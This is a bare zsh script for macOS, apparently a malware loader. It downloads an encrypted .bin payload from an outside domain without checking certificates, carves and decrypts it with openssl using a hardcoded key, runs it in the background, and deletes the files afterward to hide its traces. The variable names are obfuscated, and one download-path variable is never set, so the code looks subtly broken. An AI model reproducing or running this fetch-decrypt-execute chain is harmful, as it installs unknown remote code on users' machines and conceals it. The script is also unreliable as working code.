#!/bin/zsh
pepvt=$(mktemp /tmp/4duey3.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m2113c8bbf58d0496.bin" -o "$pepvtz" || exit 1
btaey9=$(stat -f %z "$pepvtz"); y6bxxt9=$(( btaey9 - 2649 - 460 ))
tail -c +$(( 2649 + 1 )) "$pepvtz" | head -c $y6bxxt9 | openssl enc -d -aes-256-cbc -k 389d3200c4b942c7f0ee773b -out "$pepvt" 2>/dev/null
[ -s "$pepvt" ] && chmod 700 "$pepvt" && ( "$pepvt" & ) && disown
( sleep 3; rm -f "$pepvt" "$pepvtz" ) &>/dev/null &
